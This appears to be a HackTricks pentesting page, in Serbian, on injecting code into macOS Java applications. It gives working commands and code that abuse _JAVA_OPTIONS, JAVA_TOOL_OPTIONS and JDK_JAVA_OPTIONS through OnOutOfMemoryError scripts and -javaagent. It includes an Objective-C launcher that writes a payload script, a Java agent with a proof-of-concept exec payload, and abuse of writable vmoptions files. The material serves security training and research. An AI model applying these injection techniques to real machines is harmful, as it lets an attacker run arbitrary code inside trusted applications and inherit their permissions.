# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumeracija

Pronađite Java aplikacije instalirane na sistemu. Uočeno je da će Java aplikacije u datoteci **Info.plist** sadržati određene Java parametre koji sadrže string **`java.`**, pa možete pretražiti upravo taj string:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Promenljiva okruženja **`_JAVA_OPTIONS`** može se koristiti za ubacivanje proizvoljnih Java VM parametara prilikom pokretanja Java aplikacije.<sup>[[1]](#references)</sup>

Java launch stack takođe prepoznaje dve bolje definisane promenljive sa različitim opsezima:

- `JAVA_TOOL_OPTIONS` se čita kada se VM kreira, uključujući neke ugrađene putanje pokretanja koje ne prolaze kroz `java` launcher. Može da ubaci instrumentation opcije kao što su `-javaagent`, `-agentlib` ili `-agentpath`.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` `java` launcher dodaje na početak svoje komandne linije. Opcije koje biraju main class ili prekidaju launcher nisu dozvoljene, ali je `-javaagent` prihvaćen.<sup>[[5]](#references)</sup>

Sve tri promenljive treba tretirati kao kontrole izvršavanja koda u JVM-u kada attacker može da obezbedi i kompatibilan agent koji može da se učita. `_JAVA_OPTIONS` je HotSpot implementacioni detalj, zato ga validirajte u odnosu na tačnog vendor-a i verziju; `JAVA_TOOL_OPTIONS` ili `JDK_JAVA_OPTIONS` su pogodnije za prenosivo testiranje.
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Da biste ga izvršili kao novi process, a ne kao child trenutnog terminala, možete koristiti:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Međutim, ta tehnika izaziva grešku u aplikaciji koja se izvršava. Diskretnija alternativa je kreiranje Java agent-a i korišćenje opcije `-javaagent`:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> Kreiranje agenta sa **drugom Java verzijom** od one koju koristi aplikacija može srušiti i agent i aplikaciju.

Agent može biti:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Za kompajliranje agenta pokrenite:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Sa `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
A zatim eksportujte env promenljivu i pokrenite java aplikaciju ovako:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions fajl

Ovaj fajl podržava navođenje **Java parametara** prilikom izvršavanja Java-e. Možete koristiti neke od prethodnih tehnika da promenite Java parametre i **naterate proces da izvrši proizvoljne komande**.\
Pored toga, ovaj fajl može da **uključi druge fajlove** pomoću direktive `include`, tako da možete promeniti i uključeni fajl.

Štaviše, neke Java aplikacije će **učitati više od jednog `vmoptions`** fajla.

Neke aplikacije, kao što je Android Studio, u svom **izlazu navode gde traže** ove fajlove:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Ako to ne urade, možete proveriti pomoću:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Imajte na umu da Android Studio u ovom primeru pokušava da učita **`/Applications/Android Studio.app.vmoptions`**, lokaciju kojoj bilo koji korisnik u **`admin` grupi ima dozvolu za upis**.

## References

- [1] [OpenJDK — parsiranje `_JAVA_OPTIONS` u `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — specifikacija paketa `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — Konfigurisanje JVM opcija i svojstava platforme](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [Pokretač `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
